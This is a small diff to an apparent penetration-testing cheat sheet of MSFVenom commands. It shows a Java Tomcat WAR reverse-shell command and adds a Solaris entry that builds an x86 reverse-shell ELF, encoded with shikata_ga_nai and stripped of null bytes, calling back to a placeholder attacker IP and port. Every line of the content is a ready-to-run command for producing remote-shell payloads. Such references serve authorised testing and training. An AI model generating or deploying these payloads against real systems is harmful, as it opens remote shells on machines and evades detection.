@@ -16,3 +16,7 @@ This section is for all LINUX binary creation techniques used with MSFVenom
 ## JAVA TOMCAT
 ### .WAR File
 `./msfvenom --platform=(OS TYPE) --payload=java/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=6666 -f shell.war`
+
+## SunOS (Solaris)
+### Elf File
+`/msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf`
